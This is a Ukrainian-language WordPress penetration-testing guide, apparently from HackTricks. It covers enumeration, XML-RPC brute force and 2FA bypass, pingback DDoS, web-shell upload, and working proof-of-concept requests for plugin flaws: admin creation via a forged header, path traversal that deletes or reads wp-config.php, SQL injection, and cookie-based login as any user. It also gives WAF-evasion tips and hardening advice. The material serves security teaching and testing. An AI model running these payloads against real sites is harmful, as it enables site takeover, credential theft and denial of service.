# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

- **Uploaded** файли потрапляють у: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** тому якщо ви зміните якийсь php теми, щоб отримати RCE, ви, ймовірно, будете використовувати цей шлях. Наприклад: використовуючи **theme twentytwelve** ви можете отримати доступ до файлу **404.php** за адресою: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- У **wp-config.php** можна знайти root-пароль бази даних.
- Шляхи для входу за замовчуванням, які варто перевірити: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` містить корисну інформацію, наприклад версію встановленого WordPress.
- `wp-activate.php` використовується для процесу активації через email при налаштуванні нового сайту WordPress.
- Папки для логіну (можуть бути перейменовані для приховування):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` — файл, який реалізує функцію WordPress, що дозволяє передавати дані з використанням HTTP як транспортного механізму та XML як механізму кодування. Цей тип комунікації був замінений WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Папка `wp-content` — це головний каталог, де зберігаються плагіни та теми.
- `wp-content/uploads/` — каталог, куди зберігаються всі файли, завантажені на платформу.
- `wp-includes/` — каталог, де зберігаються основні файли, такі як сертифікати, шрифти, JavaScript-файли та віджети.
- `wp-sitemap.xml` У WordPress версіях 5.5 і вище, WordPress генерує sitemap XML файл з усіма публічними постами та публічно доступними типами записів і таксономіями.

**Post exploitation**

- Файл `wp-config.php` містить інформацію, необхідну WordPress для підключення до бази даних, таку як назва бази даних, хост бази даних, ім'я користувача та пароль, authentication keys and salts, та префікс таблиць бази даних. Цей конфігураційний файл також можна використовувати для активації DEBUG режиму, що може бути корисним при усуненні несправностей.

### Права користувачів

- **Administrator**
- **Editor**: Публікує та керує своїми й чужими публікаціями
- **Author**: Публікує та керує власними публікаціями
- **Contributor**: Пише та керує своїми публікаціями, але не може їх публікувати
- **Subscriber**: Переглядає пости та редагує свій профіль

## **Passive Enumeration**

### **Get WordPress version**

Перевірте, чи можете знайти файли `/license.txt` або `/readme.html`

У **вихідному коді** сторінки (приклад з [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Файли підключення CSS

![](<../../images/image (533).png>)

- Файли JavaScript

![](<../../images/image (524).png>)

### Отримати плагіни
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Отримання тем
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Загальне отримання версій
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Активне перерахування

### Плагіни та Теми

Ви, ймовірно, не зможете знайти всі плагіни та теми, які можуть бути присутні. Щоб виявити їх усі, потрібно **активно Brute Force список плагінів та тем** (на щастя, існують автоматизовані інструменти, що містять ці списки).

### Користувачі

- **ID Brute:** Ви отримуєте дійсних користувачів з WordPress-сайту шляхом Brute Forcing ID користувачів:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Якщо відповіді — **200** або **30X**, це означає, що id — **валідний**. Якщо відповідь — **400**, то id — **невалідний**.

- **wp-json:** Ви також можете спробувати отримати інформацію про користувачів, зробивши запит:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Ще один endpoint `/wp-json/`, який може розкрити деяку інформацію про користувачів:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Інформація буде надана лише про користувачів, у яких ця функція увімкнена**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: під час входу через **`/wp-login.php`** **повідомлення** **відрізняється** і вказує, **чи існує ім'я користувача чи ні**.

### XML-RPC

Якщо `xml-rpc.php` активний, ви можете виконати brute-force облікових даних або використати його для запуску DoS атак на інші ресурси. (Ви можете автоматизувати цей процес[ using this](https://github.com/relarizky/wpxploit) наприклад).

Щоб перевірити, чи він активний, спробуйте звернутися до _**/xmlrpc.php**_ та надіслати такий запит:

**Перевірка**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** є деякими з методів, які можна використати для brute-force credentials. Якщо ви знайдете будь-який з них, ви можете надіслати щось на кшталт:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Повідомлення _"Incorrect username or password"_ у відповіді з кодом 200 має з'являтися, якщо credentials недійсні.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Використовуючи правильні credentials, ви можете завантажити файл. У відповіді з'явиться шлях ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Цей метод призначений для програм, а не для людей, і доволі старий, тому він не підтримує 2FA. Отже, якщо у вас є валідні creds, але головний вхід захищений 2FA, **ви можете зловживати xmlrpc.php щоб увійти з цими creds, обходячи 2FA**. Зауважте, що ви не зможете виконувати всі дії, доступні через консоль, але все ще можете отримати RCE, як пояснює Ippsec у [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Якщо ви знайдете метод _**pingback.ping**_ у списку, ви можете змусити Wordpress надіслати довільний запит на будь-який хост/порт.\
Це можна використати, щоб змусити **тисячі** сайтів **Wordpress** звернутися до однієї **локації** (унаслідок чого там спричиниться **DDoS**), або ви можете використати це, щоб змусити **Wordpress** просканувати якусь внутрішню **мережу** (ви можете вказати будь-який порт).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Якщо ви отримуєте **faultCode** зі значенням **більшим** за **0** (17), це означає, що порт відкритий.

Зверніть увагу на використання **`system.multicall`** у попередньому розділі, щоб дізнатися, як зловживати цим методом для спричинення DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Цей файл зазвичай знаходиться в корені сайту Wordpress: **`/wp-cron.php`**\
Коли цей файл **accessed**, виконується "**heavy**" MySQL **query**, тож його можуть використовувати **attackers** для **cause** **DoS**.\
Також за замовчуванням `wp-cron.php` викликається при кожному завантаженні сторінки (коли клієнт запитує будь-яку сторінку Wordpress), що на сайтах з великим трафіком може спричиняти проблеми (DoS).

Рекомендується відключити Wp-Cron і створити реальний cronjob на хості, який виконуватиме потрібні дії з регулярним інтервалом (без викликання проблем).

### /wp-json/oembed/1.0/proxy - SSRF

Спробуйте отримати доступ до _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ і Worpress site може зробити запит до вас.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Цей інструмент перевіряє, чи існує **methodName: pingback.ping** та шлях **/wp-json/oembed/1.0/proxy**, і якщо вони є, намагається їх експлуатувати.

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Отримання доступу шляхом перезапису біта

Скоріше цікавинка, ніж реальна атака. У CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ви могли перевернути 1 біт у будь-якому wordpress файлі. Тобто можна було змінити позицію `5389` у файлі `/var/www/html/wp-includes/user.php`, щоб зробити NOP для операції NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Панель RCE**

**Зміна php у використовуваній темі (потрібні admin credentials)**

Appearance → Theme Editor → 404 Template (праворуч)

Замініть вміст на php shell:

![](<../../images/image (384).png>)

Пошукайте в інтернеті, як отримати доступ до оновленої сторінки. У цьому випадку потрібно перейти за адресою: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Можна використати:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
щоб отримати сесію.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Створіть ваш php backdoor, наприклад:

![](<../../images/image (183).png>)

Потім додайте новий plugin:

![](<../../images/image (722).png>)

Завантажте plugin та натисніть Install Now:

![](<../../images/image (249).png>)

Натисніть Procced:

![](<../../images/image (70).png>)

Мабуть, це нібито нічого не зробить, але якщо перейти в Media, ви побачите ваш shell, що був завантажений:

![](<../../images/image (462).png>)

Відкрийте його і ви побачите URL для виконання reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

This method involves the installation of a malicious plugin known to be vulnerable and can be exploited to obtain a web shell. This process is carried out through the WordPress dashboard as follows:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Перейдіть у WordPress dashboard, потім Dashboard > Plugins > Upload Plugin.
- Завантажте zip-файл завантаженого плагіну.
3. **Plugin Activation**: Після успішної інсталяції плагін потрібно активувати через dashboard.
4. **Exploitation**:
- Якщо плагін "reflex-gallery" встановлений і активований, його можна експлуатувати, оскільки він відомий як вразливий.
- Metasploit framework надає експлойт для цієї вразливості. Завантаживши відповідний модуль та виконавши потрібні команди, можна встановити meterpreter session, що надає несанкціонований доступ до сайту.
- Варто зазначити, що це лише один із багатьох методів експлуатації WordPress сайту.

Контент містить ілюстрації, що зображують кроки в WordPress dashboard для встановлення та активації плагіну. Однак важливо зазначити, що експлуатація вразливостей таким чином є незаконною та неетичною без належного дозволу. Цю інформацію слід використовувати відповідально і тільки в легальному контексті, наприклад, під час penetration testing з явним дозволом.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Створює користувача у WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Завантажує ваш custom plugin (backdoor) у WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Редагує вбудовані плагіни у WordPress.
- _**(RCE) Built-In Theme Edit:**_ Редагує вбудовані теми у WordPress.
- _**(Custom) Custom Exploits:**_ Користувацькі експлойти для сторонніх плагінів/тем WordPress.

## Post Exploitation

Витягнути імена користувачів та паролі:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Змінити пароль адміністратора:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Знання того, як Wordpress plugin може експонувати функціональність, є ключовим для знаходження вразливостей у цій функціональності. Ви можете знайти, як плагін може експонувати функціональність, у наведених пунктах та переглянути приклади вразливих плагінів у [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Один зі способів, яким Wordpress plugin може виставляти функції для users — через AJAX handlers. Вони можуть містити помилки в логіці, authorization або authentication. Більше того, доволі frequently ці функції будуть базувати і authentication, і authorization на наявності wordpress nonce, який **any user authenticated in the Wordpress instance might have** (незалежно від його role).

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Використання `nopriv` робить endpoint доступним для будь-яких користувачів (навіть неавторизованих).**

> [!CAUTION]
> Крім того, якщо функція лише перевіряє авторизацію користувача за допомогою функції `wp_verify_nonce`, ця функція лише перевіряє, що користувач увійшов у систему — вона зазвичай не перевіряє роль користувача. Тому користувачі з низькими привілеями можуть мати доступ до дій, що вимагають високих привілеїв.

- **REST API**

Також можливо відкривати доступ до функцій wordpress, реєструючи REST API за допомогою функції `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` — це callback-функція, яка перевіряє, чи авторизований конкретний користувач для виклику API-методу.

**Якщо використовується вбудована функція `__return_true`, вона просто пропустить перевірку прав користувача.**

- **Direct access to the php file**

Звісно, Wordpress використовує PHP, і файли всередині плагінів доступні безпосередньо з вебу. Тому, якщо плагін відкриває вразливу функціональність, яка спрацьовує лише при доступі до файлу, її зможе експлуатувати будь-який користувач.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Деякі плагіни реалізують «довірені заголовки» як скорочення для внутрішніх інтеграцій або reverse proxies і потім використовують цей заголовок, щоб встановити поточний контекст користувача для REST-запитів. Якщо заголовок не пов'язаний криптографічно з запитом компонентом upstream, атакуючий може підробити його і звертатися до привілейованих REST-маршрутів як адміністратор.

- Impact: неавторизоване підвищення привілеїв до admin шляхом створення нового адміністратора через основний users REST-маршрут.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (примушує user ID 1, зазвичай перший акаунт адміністратора).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Чому це працює

- Плагін зіставляє заголовок, контрольований клієнтом, зі станом автентифікації та пропускає перевірки capability.
- WordPress core очікує capability `create_users` для цього маршруту; експлойт плагіна обходить це, безпосередньо встановлюючи контекст поточного користувача з заголовка.

Очікувані індикатори успіху

- HTTP 201 з JSON-тілом, що описує створеного користувача.
- Новий користувач з правами адміністратора, видимий у `wp-admin/users.php`.

Чекліст виявлення

- Grep для `getallheaders()`, `$_SERVER['HTTP_...']` або vendor SDKs, які читають кастомні заголовки для встановлення контексту користувача (наприклад, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Перегляньте реєстрації REST на предмет привілейованих callback-ів, які не мають надійних перевірок `permission_callback` і натомість покладаються на заголовки запиту.
- Шукайте використання основних функцій управління користувачами (`wp_insert_user`, `wp_create_user`) всередині REST-обробників, доступні лише за значеннями заголовків.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

Теми та плагіни WordPress часто відкривають AJAX-обробники через хуки `wp_ajax_` та `wp_ajax_nopriv_`. Коли використовується варіант **_nopriv_** **callback стає доступним для неавторизованих відвідувачів**, тому будь-яка чутлива дія повинна додатково реалізувати:

1. Перевірку прав (наприклад, `current_user_can()` або принаймні `is_user_logged_in()`), та
2. CSRF nonce, валідацію якого виконують `check_ajax_referer()` / `wp_verify_nonce()`, та
3. Строгу санітизацію / валідацію введених даних.

Мультифункціональна тема Litho (< 3.1) пропустила ці три контролі у функції *Remove Font Family* і в результаті містила такий код (спрощено):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Неавторизований доступ** – зареєстровано хук `wp_ajax_nopriv_`.
* **No nonce / capability check** – будь-який відвідувач може звернутися до endpoint.
* **No path sanitisation** – рядок, керований користувачем, `fontfamily` конкатенується з файловим шляхом без фільтрації, що дозволяє класичну `../../` traversal.

#### Експлуатація

Атакуючий може видалити будь-який файл або директорію **нижче базового каталогу uploads** (зазвичай `<wp-root>/wp-content/uploads/`) відправивши один HTTP POST запит:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Оскільки `wp-config.php` розташований поза каталогом *uploads*, на стандартній установці достатньо чотирьох послідовностей `../`. Видалення `wp-config.php` примушує WordPress перейти в *майстер встановлення* при наступному відвідуванні, що дозволяє повне захоплення сайту (атакуючий просто подає нову DB-конфігурацію і створює admin-користувача).

Інші критичні цілі включають файли плагінів/теми `.php` (щоб зламати плагіни безпеки) або правила `.htaccess`.

#### Чекліст виявлення

* Будь-який обробник `add_action( 'wp_ajax_nopriv_...')`, який викликає допоміжні функції файлової системи (`copy()`, `unlink()`, `$wp_filesystem->delete()`, тощо).
* Конкатенація неочищених даних від користувача в шляхи (шукайте `$_POST`, `$_GET`, `$_REQUEST`).
* Відсутність `check_ajax_referer()` та `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation через відновлення застарілих ролей та відсутність перевірки авторизації (ASE "View Admin as Role")

Багато плагінів реалізують функцію "view as role" або тимчасової зміни ролі, зберігаючи початкові ролі в user meta, щоб пізніше їх відновити. Якщо шлях відновлення покладається лише на параметри запиту (наприклад, `$_REQUEST['reset-for']`) і список, яким керує плагін, без перевірки capabilities та валідного nonce, це перетворюється на вертикальне privilege escalation.

Реальний приклад було знайдено в плагіні Admin and Site Enhancements (ASE) (≤ 7.6.2.1). Гілка reset відновлювала ролі на основі `reset-for=<username>`, якщо ім'я користувача з'являлося у внутрішньому масиві `$options['viewing_admin_as_role_are']`, але не виконувала ні перевірки `current_user_can()`, ні перевірки nonce перед видаленням поточних ролей та повторним додаванням збережених ролей з user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Чому це можна експлуатувати

- Довіряється `$_REQUEST['reset-for']` та опції плагіна без серверної авторизації.
- Якщо користувач раніше мав вищі привілеї, збережені в `_asenha_view_admin_as_original_roles`, і його понизили, він може відновити їх, перейшовши за шляхом скидання.
- У деяких розгортаннях будь-який автентифікований користувач міг би ініціювати скидання для іншого імені користувача, яке все ще присутнє в `viewing_admin_as_role_are` (порушена авторизація).

Експлуатація (приклад)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
На вразливих збірках це видаляє поточні ролі та додає збережені оригінальні ролі (наприклад, `administrator`), фактично підвищуючи привілеї.

Detection checklist

- Шукайте функції переключення ролей, які зберігають “оригінальні ролі” в user meta (наприклад, `_asenha_view_admin_as_original_roles`).
- Визначте шляхи скидання/відновлення, які:
- Читують імена користувачів з `$_REQUEST` / `$_GET` / `$_POST`.
- Модифікують ролі через `add_role()` / `remove_role()` без `current_user_can()` та `wp_verify_nonce()` / `check_admin_referer()`.
- Авторизують на основі масиву опцій плагіна (наприклад, `viewing_admin_as_role_are`) замість capabilities актора.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Деякі плагіни підключають допоміжні функції переключення користувачів до публічного хука `init` і визначають ідентичність з cookie, контрольованого клієнтом. Якщо код викликає `wp_set_auth_cookie()` без перевірки автентифікації, capability та дійсного nonce, будь-який неавторизований відвідувач може примусово увійти як довільний user ID.

Типовий вразливий шаблон (спрощено з Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Чому це можна експлуатувати

- Публічний хук `init` робить обробник доступним для неавторизованих користувачів (немає захисту `is_user_logged_in()`).
- Ідентичність отримується з cookie, що модифікується на боці клієнта (`original_user_id`).
- Прямий виклик `wp_set_auth_cookie($uid)` залогінює запитувача як того користувача без будь-яких перевірок capability/nonce.

Експлуатація (неавторизована)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Особливості WAF для CVE WordPress/плагінів

Загальні edge/server WAF налаштовані на широкі сигнатури (SQLi, XSS, LFI). Багато вразливостей WordPress/плагінів з високим ступенем впливу — це баги логіки/auth на рівні застосунку, які виглядають як доброзичливий трафік, якщо рушій не розуміє маршрути WordPress та семантику плагінів.

Поради для атакуючого

- Цільтеся в ендпоінти, специфічні для плагіна, використовуючи чисті payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Спочатку перевіряйте неавтентифіковані шляхи (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads часто спрацьовують без обфускації.
- Типові високовпливові випадки: privilege escalation (порушення контролю доступу), arbitrary file upload/download, LFI, open redirect.

Поради щодо захисту

- Не покладайтеся на загальні сигнатури WAF для захисту CVE плагінів. Реалізуйте віртуальні патчі на рівні застосунку, специфічні для вразливості, або оновлюйтеся швидко.
- Віддавайте перевагу позитивним перевіркам безпеки в коді (capabilities, nonces, strict input validation) замість негативних regex-фільтрів.

## Захист WordPress

### Регулярні оновлення

Переконайтеся, що WordPress, плагіни та теми оновлені. Також перевірте, що автоматичне оновлення увімкнено в wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Крім того, **встановлюйте лише надійні плагіни та теми WordPress**.

### Плагіни безпеки

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Інші рекомендації**

- Видаліть користувача за замовчуванням **admin**
- Використовуйте **надійні паролі** та **2FA**
- Періодично **перевіряйте** **дозволи** користувачів
- **Обмежте кількість спроб входу** для запобігання Brute Force атак
- Перейменуйте файл **`wp-admin.php`** та дозволяйте доступ лише зсередини мережі або з певних IP-адрес.


### Неавторизований SQL Injection через недостатню перевірку (WP Job Portal <= 2.3.2)

Плагін WP Job Portal для підбору персоналу відкрив задачу **savecategory**, яка зрештою виконує наступний вразливий код у `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Проблеми, які вносять цей фрагмент:

1. **Несанітизований ввід користувача** – `parentid` надходить безпосередньо з HTTP-запиту.
2. **Конкатенація рядків у WHERE-умові** – відсутні `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – хоча дія виконується через `admin-post.php`, єдина перевірка — **CSRF nonce** (`wp_verify_nonce()`), який будь-який відвідувач може отримати зі сторінки, що вбудовує шорткод `[wpjobportal_my_resumes]`.

#### Експлуатація

1. Отримати свіжий nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Інжектувати довільний SQL, зловживаючи `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Відповідь розкриває результат інжектованого запиту або змінює базу даних, що підтверджує наявність SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Ще одна задача, **downloadcustomfile**, дозволяла відвідувачам завантажувати **будь-який файл на диску** через path traversal. Уразливий sink знаходиться в `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` контролюється атакуючим і конкатенується **без санітизації**. Знову ж, єдиним бар'єром є **CSRF nonce**, який можна отримати зі сторінки резюме.

#### Експлуатація
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Сервер повертає вміст `wp-config.php`, leaking DB credentials and auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Багато тем/плагінів містять "social login" helpers, доступні через admin-ajax.php. Якщо unauthenticated AJAX action (wp_ajax_nopriv_...) довіряє client-supplied identifiers, коли provider data відсутні, і потім викликає wp_set_auth_cookie(), це перетворюється на full authentication bypass.

Типовий проблемний шаблон (спрощено)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
